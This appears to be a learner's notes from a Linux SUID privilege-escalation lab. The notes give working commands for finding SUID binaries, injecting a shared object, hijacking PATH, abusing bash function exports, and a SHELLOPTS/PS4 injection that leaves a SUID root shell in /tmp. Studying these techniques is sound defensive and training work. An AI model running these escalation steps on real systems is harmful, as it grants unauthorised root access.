SUID is related to permission. From what I understand, and I might be wrong(read more about this), SUID permission make it so that the executable is run as root/have root permission. That's why its useful as privilege escalation exploit.

### Known Exploits
Finding all SUID executable:
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check if there is an exploit related to those program(google, exploitdb, github). 
SUID probably known to be exploitable/vulnerable.

### Shared Object Injection
This one is kinda similiar to the cron jobs one, which is putting an exploit to a lower privilege area where it would be read(injected) by a high privilege(root) program. Thus a privilege escalated shell is executed.

This one use suid-so executable.
``` bash 
/usr/local/bin/suid-so
```
Then this one(strace) probably look at the program shared object that it tries to load but failed
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
----------------Redacted------------
	open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```
noticing that it tries to open a file that the lower privilege have access to, we then create the rogue shared object
```shell
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
Voila! When we run the executable, the root shell opened
### Environment Variables
`/usr/local/bin/suid-env` apparently inherit the user PATH variable(I don' know where this info comes from).

Looking at the executable readable strings
```bash
strings /usr/local/bin/suid-env
```
We find that it start a service `service apache2 start` withouth using a full path.
Because we can change the PATH variable, we can manipulate it to instead open a rogue `./service` file in our chosen path.
```bash
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
```
The second line prepend the path to our current directory(where our service code is), then execute the suid-env.

### Abusing Shell Feature
`/usr/local/bin/suid-env2` is similiar to `/usr/local/bin/suid-env`, except that it uses absolute path so we can't use the previous exploit. Instead, we abuse the bash vulnerability that exist in bash version <4.2-048.
Check bash version
```bash
/bin/bash --version
```
Then we create a bash function that is named like a path, so we would run those function instead of the actual service
```bash
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```

### Abusing Shell Feature 2
In bash version < 4.4, this exploit can be used
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```
It creates a SUIDed bash that's used as a privilege escalation.
